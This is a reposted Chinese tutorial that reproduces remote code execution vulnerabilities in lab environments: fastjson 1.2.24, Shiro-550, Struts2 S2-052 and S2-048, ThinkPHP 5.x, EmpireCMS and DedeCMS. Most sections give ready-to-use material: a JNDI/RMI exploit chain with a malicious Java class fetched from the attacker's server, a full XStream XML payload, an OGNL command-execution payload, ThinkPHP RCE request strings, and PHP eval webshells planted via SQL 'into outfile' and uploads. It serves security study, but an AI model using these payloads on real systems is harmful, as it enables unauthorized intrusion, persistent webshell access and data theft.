# 转载
：  常见的RCE漏洞复现(CVE-2017-18349)

# 常见的RCE漏洞复现(CVE-2017-18349)

**目录**

[fastjson/1.2.24-rce反序列化 RCE 漏洞复现(CVE-2017-18349)](#fastjson%2F1.2.24-rce%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2017-18349%29)

[靶机环境](#%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83)

[攻击机环境](#%E6%94%BB%E5%87%BB%E6%9C%BA%E7%8E%AF%E5%A2%83)

[shiro漏洞](#shiro%E6%BC%8F%E6%B4%9E)

[Shiro-550 反序列化漏洞(CVE-2016-4437)](#Shiro-550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2016-4437%29)

[struts2](#struts2)

[反序列化漏洞(CVE-2017-9805)](#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2017-9805%29)

[Content-Type注入漏洞(CVE-2017-9791)](#Content-Type%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2017-9791%29)

[ThinkPHP漏洞](#ThinkPHP%E6%BC%8F%E6%B4%9E)

[ThinkPHP5.0.23 远程代码执行漏洞](#ThinkPHP5.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)

[ThinkPHP 5.0.22/5.1.29 远程代码执行漏洞](#ThinkPHP%205.0.22%2F5.1.29%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)

[帝国cms漏洞](#%E5%B8%9D%E5%9B%BDcms%E6%BC%8F%E6%B4%9E)

[后台代码注入漏洞](#%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)

[EmpireCMS 代码注入漏洞(CVE-2018-18086)](#EmpireCMS%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2018-18086%29)

[EmpireCMS SQL注入漏洞(CVE-2018-19462)](#EmpireCMS%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2018-19462%29)

[织梦cms漏洞](#%E7%BB%87%E6%A2%A6cms%E6%BC%8F%E6%B4%9E)

[未授权RCE漏洞(v5.8.1)](#%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E%28v5.8.1%29)

[未公开的漏洞](#%E6%9C%AA%E5%85%AC%E5%BC%80%E7%9A%84%E6%BC%8F%E6%B4%9E)

[后台文件上传漏洞(dedecms_v5.7.111)](#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28dedecms_v5.7.111%29)

[方法一](#%E6%96%B9%E6%B3%95%E4%B8%80)

[方法二](#%E6%96%B9%E6%B3%95%E4%BA%8C)

---


```
中间件漏洞（Middleware Vulnerabilities）：

1. 含义：中间件漏洞是指在应用程序中使用的中间件组件（例如，数据库管理系统，消息队列，缓存系统等）中存在的安全弱点或漏洞。这些中间件组件通常用于存储和处理应用程序数据，如果它们存在漏洞，可能会对应用程序的数据安全性和整体安全性造成风险。

2. 相同点：
   - 第三方依赖：中间件漏洞通常源自于应用程序依赖的第三方中间件组件，这与框架漏洞有相似之处。
   - 安全威胁：中间件漏洞可能会导致应用程序受到不同类型的安全威胁，包括数据泄露、数据篡改和拒绝服务攻击等。

3. 不同点：
   - 范围：中间件漏洞通常指的是在应用程序依赖的中间件组件中发现的漏洞，而框架漏洞是指在应用程序的开发框架中发现的漏洞。
   - 影响范围：中间件漏洞可能会直接影响应用程序依赖的中间件组件的安全性，而框架漏洞可能会影响整个应用程序的安全性。
   - 解决方法：解决中间件漏洞通常需要升级或配置中间件组件本身，而解决框架漏洞通常需要升级或修复开发框架本身。

总之，框架漏洞和中间件漏洞都是可能导致应用程序安全问题的漏洞类型，但它们的范围和影响范围有所不同，因此需要采取不同的解决方法来缓解它们的风险。

```

### fastjson/1.2.24-rce反序列化 RCE 漏洞复现(CVE-2017-18349)

```
搭配阅读
https://blog.csdn.net/SuPejkj/article/details/109190901

```

```
漏洞简介
Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。
fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。
利用版本: fastjson &lt;= 1.2.24


提供服务器端、安卓客户端两种解析工具，性能表现较好。
提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方 法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。
允许转换预先存在的无法修改的对象（只有class、无源代码）。
Java泛型的广泛支持。
允许对象的自定义表示、允许自定义序列化类。
支持任意复杂对象（具有深厚的继承层次和广泛使用的泛型类型）。


JNDI是 Java 命名与目录接口（Java Naming and Directory Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。
JNDi是应用程序设计的Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：
DNS、LDAP、CORBA对象服务、RMI


RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。

RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。


区别:
反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。

RMI是一种行为，指的是Java远程方法调用。

JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。

ldap指轻量级目录服务协议。

```

```
漏洞原理

如果我们可以控制JNDI客户端中传入的url，就可以起一个恶意的RMI，让JNDI来加载我们的恶意类从而进行命令执行。

我们来看一下References，References类有两个属性，className和codebase url，className就是远程引用的类名，codebase决定了我们远程类的位置，当本地classpath中没有找到对应的类的时候，就会去请求codebase地址下的类（codebase支持http协议），此时如果我们将codebase地址下的类换成我们的恶意类，就能让客户端执行。

ps：在java版本大于1.8u191之后版本存在trustCodebaseURL的限制，只能信任已有的codebase地址，不再能够从指定codebase中下载字节码。

1.首先开启HTTP服务器，并将我们的恶意类放在目录下
2.开启恶意RMI服务器
3.攻击者控制url参数为上一步开启的恶意RMI服务器地址
4.恶意RMI服务器返回ReferenceWrapper类
5.目标（JNDI_Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码


```

```
靶机 kali 2021
攻击机 kali 2023
靶机IP地址 192.168.139.136
攻击机IP地址 192.168.139.129


```

#### 靶机环境

```
升级apt-get

apt-get update

安装docker
sudo apt-get install docker.io
sudo apt-get install docker-compose

下载vulhub
git clone https://github.com/vulhub/vulhub.git

通过vulhub安装环境
cd vulhub/fastjson/1.2.24-rce
docker-compose up -d

```

#### 攻击机环境

```
下载并配置java 1.8.0_20环境
sudo mkdir -p /usr/local/java
cd /usr/local/java
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk- 8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
sudo vim /etc/profile

文件末尾添加：
JAVA_HOME=/usr/local/java/jdk1.8.0_20
PATH=$PATH:$HOME/bin:$JAVA_HOME/bin
export JAVA_HOME
export PATH

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/local/java/jdk1.8.0_20/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/local/java/jdk1.8.0_20/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/local/java/jdk1.8.0_20/bin/javaws" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/local/java/jdk1.8.0_20/bin/javaws" 1

配置kali jdk环境
source /etc/profile
apt install default-jdk


如果有1.80版本的Java可以直接跳到这一步
切换版本
update-alternatives --config java
update-alternatives --config javac

```

任意位置恶意exp代码

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

cd到Exp.java文件的位置并执行
javac Exp.java    结果如下

```

```
搭建http服务传输恶意文件
在所在目录开启http服务
python -m http.server 4444

```

```
利用java 反序列化利用工具 marshalsec

git clone https://github.com/mbechler/marshalsec.git 下载marshalsec

apt-get install maven 安装maven

mvn clean package -DskipTests 使用maven编译marshalsec成jar包
建议使用梯子,如下图下载的很多,很小但是很慢
也可以联系我我发给你这个项目,实测是可以操作的

```

```
启动RMI服务器

然后借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类

cd target

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.139.129:4444/#Exp" 9999
（这里如果要启动LDAP服务的话，只需把上面命令中的RMI改成LDAP即可）

```

```
通过burp抓取靶场数据包(http://192.168.139.136:8090)并写入poc(请求包里面请求方式改成post，Content-Type改成application/json)：
并添加
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.139.129:9999/Exp",
        "autoCommit":true
    }
}

```

```
发送到回放模块
进行测试


最后
进入docker环境
docker exec -it (xx) bash  xx为CONTAINER ID
查看tmp目录文件
cd /tmp
ls -al

```

### shiro漏洞

#### Shiro-550 反序列化漏洞(CVE-2016-4437)

```
Apache Shiro 是一个强大灵活的开源的Java安全框架Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境Shiro可以实现，认证，授权，加密，会话管理，Web集成，缓存等功能

```

```
Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。所以我们Payload产生的过程：命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值


在请求包的Cookie中为 rememberMe字段赋任意值，收到返回包的 Set- Cookie 中存在 rememberMe=deleteMe 字段，说明目标有使用Shiro框
架，可以进一步测试。Shiro 1.2.4及之前的版本中，AES加密的密钥默认硬编码在代码里（SHIRO-550），Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。影响版本为 Apache Shiro &lt; 1.2.4

```

```
漏洞验证
未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe 字段
不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段
勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段
或者可以在cookie后面自己加一个rememberMe=1,看返回包有没有rememberMe= deleteMe

```

```
安装环境
升级apt-get
apt-get update
安装docker
sudo apt-get install docker.io
sudo apt-get install docker-compose
下载vulhub
git clone https://github.com/vulhub/vulhub.git
通过vulhub安装环境
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d

保证可以访问页面

```

```
进行功能验证
下载shiro_attack_2.2漏洞利用工具
配置本地jdk环境为1.8
在项目中使用java -jar shiro_attack-2.2.jar打开工具
通过工具进行漏洞探测及利用

```

```
编写bat脚本用来打开jar

java -jar shiro_attack-2.2.jar

复制http://192.168.139.136:8080/login;jsessionid=02BE4662A8A124620B96EC242B270DA6登录网址
之后步骤为
选择爆破密钥
检测当前利用链
之后就可以命令执行

```

### struts2

#### 反序列化漏洞(CVE-2017-9805)

```
CVE-2017-9805即S2-052 反序列化漏洞也被称为无限制访问漏洞Struts2反序列化漏洞是由Xstream组件在解析用户提交的XML数据时，rest-plugin会根据URI扩展名或Content-Type来判断解析方法，并且缺乏适当的输入验证和控制，导致攻击者可以修改orders.xhtml为orders.xml或修改Content-Type头为application/xml，即可在Body中传递XML数据，在XML请求中嵌入特殊的payload，从而利用反序列化漏洞进行远程代码执行。

影响版本为
Struts 2.1.2 — Struts 2.3.33
Struts 2.5 — Struts 2.5.12

方案一
升级Struts到2.5.13最新版本

方案二
如果系统没有使用Struts REST插件，那么可以直接删除Struts REST插件，或者在配置文件中加入如下代码，限制服务端文件的扩展名
&lt;constant name=”struts.action.extension” value=”xhtml,,json” /&gt;

```

```
OST /orders/3/edit HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2415

&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;
            &lt;is class="javax.crypto.CipherInputStream"&gt;
              &lt;cipher class="javax.crypto.NullCipher"&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;
                  &lt;iter class="javax.imageio.spi.FilterIterator"&gt;
                    &lt;iter class="java.util.Collections$EmptyIterator"/&gt;
                    &lt;next class="java.lang.ProcessBuilder"&gt;
                      &lt;command&gt;
                        &lt;string&gt;touch&lt;/string&gt;
                        &lt;string&gt;/tmp/success&lt;/string&gt;
                      &lt;/command&gt;
                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;
                    &lt;method&gt;
                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                      &lt;name&gt;start&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class="string"&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;
              &lt;ibuffer&gt;&lt;/ibuffer&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;
  &lt;/entry&gt;
&lt;/map&gt;

```

```
打开docker环境访问你IP地址的8080端口,通过burp抓取靶场数据包
http://192.168.139.136:8080/orders.xhtml

```

```
修改如下,虽然回显是失败但是成功上传了

```

#### Content-Type注入漏洞(CVE-2017-9791)

```
靶机环境安装

升级apt-get
apt-get update

安装docker
sudo apt-get install docker.io
sudo apt-get install docker-compose

下载vulhub
git clone https://github.com/vulhub/vulhub.git

通过vulhub安装环境
cd vulhub/struts2/s2-048
docker-compose up -d

```

```
漏洞复现

攻击机访问url
http://xxx.xxx.xxx.xxx:8080/showcase
点击选项 Integration -&gt; Struts 1 Integration
或直接访问链接
http://xxx.xxx.xxx.xxx:8080/integration/editGangster.action
尝试在表单Gangster Name中提交数据${123*100}并提交,其他输入框随意提交
查看返回结果
我们发现姓名返回结果为12300,为我们计算的结果

```

```
在Gangster Name表单中输入下面payload执行命令
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}

发现返回值中带有Gangster uid=0(root) gid=0(root) groups=0(root) added successfully

```

### ThinkPHP漏洞

#### ThinkPHP5.0.23 远程代码执行漏洞

```
ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简代码的同时，更注重易用性。ThinkPHP可以支持windows/Unix/Linux等服务器环境，正式版需要PHP 5.0以上版本，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展。

ThinkPHP5.0.23 远程代码执行漏洞由于thinkphp 5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞 影响版本为 ThinkPHP 5.x &lt; 5.1.31, &lt;= 5.0.23

```

```
使用bp抓包,修改为POST方式,URL添加/index.php?s=captcha  
使用POST传参 _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami

```

```
可以发现成功传参

```

#### ThinkPHP 5.0.22/5.1.29 远程代码执行漏洞

```
ThinkPHP 5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
这个rce漏洞归根结底就是因为 把控制器名字的 \ 开头作为类名导致我们可以实例化任意类，后面的payload也不过是基于此漏洞的利用。

```

```
靶机环境安装
升级apt-get
apt-get update

安装docker
sudo apt-get install docker.io
sudo apt-get install docker-compose

下载vulhub
git clone https://github.com/vulhub/vulhub.git

通过vulhub安装环境
cd vulhub/thinkphp/5-rce
docker-compose up -d

```

```
访问靶场页面
http://xxx.xxx.xxx.xxx:8080

访问链接来执行phpinfo函数
http://xxx.xxx.xxx.xxx:8080/index.php?s=/Index/\think\app/invokefunction&amp;func
tion=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1

```

### 帝国cms漏洞

#### 后台代码注入漏洞

```
靶机环境安装

打开phpstudy环境
下载empirecms
http://www.phome.net/download/

将upload文件夹解压到网站根目录
访问http://xxx.xxx.xxx.xxx/empire/e/install
按照提示进行安装

```

去php.ini中修改

刷新即可

登录后台

```
进入到对应的功能点
系统 -&gt; 数据表与系统模型 -&gt; 管理数据表 -&gt; 导入系统模型

```

```
导入我们的一句话木马  file_put_contents("1.php","&lt;?php @eval($_REQUEST[1]); ?&gt;");
				   file_put_contents("shell.php","&lt;?php phpinfo();?&gt;");

```

```
访问我们上传的文件
http://xxx.xxx.xxx.xxx/empire/e/admin/shell.php

```

#### EmpireCMS 代码注入漏洞(CVE-2018-18086)

```
EmpireCMS7.5版本中的/e/class/moddofun.php文件的LoadInMod函数存在
安全漏洞,攻击者可利用该漏洞上传任意文件
影响版本为 EmpireCMS &lt;= 7.5


靶机环境安装

打开phpstudy环境
下载empirecms
http://www.phome.net/download/

将upload文件夹解压到网站根目录
访问http://xxx.xxx.xxx.xxx/empire/e/install
按照提示进行安装


漏洞复现
访问并登录靶场页面(后台)
http://xxx.xxx.xxx.xxx/empire/e/admin
进入到对应的功能点
系统 -&gt; 备份与恢复数据 -&gt; 执行SQL语句
通过此处可以执行任意SQL语句
如果条件满足，那么可以通过SQL语句写入webshell
如：select '&lt;?php @eval($_POST["cmd"])?&gt;' into outfile
'C:/phpStudy/WWW/empire/shell.php'

```

#### EmpireCMS SQL注入漏洞(CVE-2018-19462)

```
EmpireCMS7.5版本中后台提供了执行SQL语句的功能，导致攻击者进入后台后可以使用任意的SQL语句，如果存在不安全的配置项，那么攻击者还可以通过执行SQL语句getshell

影响版本为 EmpireCMS &lt;= 7.5

```

```
靶机环境安装
打开phpstudy环境
下载empirecms
http://www.phome.net/download/

将upload文件夹解压到网站根目录
访问http://xxx.xxx.xxx.xxx/empire/e/install
按照提示进行安装



漏洞复现
访问并登录靶场页面(后台)
http://xxx.xxx.xxx.xxx/empire/e/admin

进入到对应的功能点
系统 -&gt; 备份与恢复数据 -&gt; 执行SQL语句

通过此处可以执行任意SQL语句
如果条件满足，那么可以通过SQL语句写入webshell
如：select '&lt;?php @eval($_POST["cmd"])?&gt;' into outfile
'C:\Users\27682\Desktop'

```

### 织梦cms漏洞

```
DedeCMS(织梦)自最初发布以来已有 16 年的历史，是一个集内容发布、编辑、管理检索等于一体的网站管理系统，凭借自身丰富的主题模板和简单易用、开源免费的特性获得了众多站长的青睐，国内有很多企业网站都是使用DedeCMS程序搭建

```

#### 未授权RCE漏洞(v5.8.1)

```
靶机环境安装
打开phpstudy环境
下载dedecms_v5.8.1
https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1

将upload文件夹解压到网站根目录并改名为dedecms
访问http://xxx.xxx.xxx.xxx/dedecms

按照提示进行安装

```

```
漏洞复现
访问靶场页面
http://192.168.1.187/DedeCMS-5.8.1/plus/flink.php

通过burp抓取靶场数据包
http://192.168.1.187/DedeCMS-5.8.1/plus/flink.php?dopost=save&amp;c=id
添加或修改Referer字段
&lt;?php echo `whoami`; ?&gt;

```

`http://192.168.1.187/DedeCMS-5.8.1/plus/flink.php`页面

```
访问http://192.168.1.187/DedeCMS-5.8.1/plus/flink.php?dopost=save&amp;c=id
正常会让提示你验证码不正确,之后会给你跳转回去,原理就是他这个referer,他会跳转回referer的地址

```

```
可以通过添加Referer: http://www.baidu.com来进行验证

```

```
我们添加referer字段
Referer: &lt;?php echo `whoami`; ?&gt;
可以获取到如下信息

```

#### 未公开的漏洞

#### 后台文件上传漏洞(dedecms_v5.7.111)

##### 方法一

```
上传一个图片马
我的图片马
GIF89a&lt;?php
@eval($_REQUEST[1]);

```

再新建一个文件,使用include来引用图片马的内容

集齐这两个文件可以召唤一个文件上传漏洞

上传完包含问价,直接访问,进行传参即可

##### 方法二

```
这个方法的大致思路是我们上传一个文件上传页面,来绕过限制

```

```
&lt;form method="post" action="#" enctype="multipart/form-data"&gt;
    &lt;input type="file" name="file"&gt;
    &lt;input type="submit" name="ok"&gt;
&lt;/form&gt;
&lt;?php
foreach($_FILES as $k =&gt; $v){
    echo $v['tmp_name'];
    move_uploaded_file($v['tmp_name'],'1.php');
}


// 如果他连$v['tmp_name']这种格式也限制了,我们可以使用这个
//foreach ($_FILES as $k =&gt; $v){
//    foreach ($v as $k1 =&gt; v1){
//        if ($k === 'tmp_name'){
//            echo $v1;
//				move_uploaded_file($v1,'1.php');
//        }
//    }
//}
?&gt;

```

把咱们写的文件上传代码上传

访问上传的文件,上传一句话木马

上传成功,会在下面显示临时文件储存的地址

同时在该目录也会有一个1.php文件

通过传参就可以访问

```
来源：https://www.freebuf.com/articles/web/382415.html
```

> 
声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/1accee0a48e04b54a570e62ae8a56e40.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/c2100d95dac34c20a17755eb3e5cf77a.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/4908dfa1ee6e45478451f4ef539f79fe.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/d68fa601c350473ea10e6bed676f14f6.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/8811dd5ddf454a51b65d9b0d3b8a6f27.png" width="665"/>

应急响应笔记

学习路线
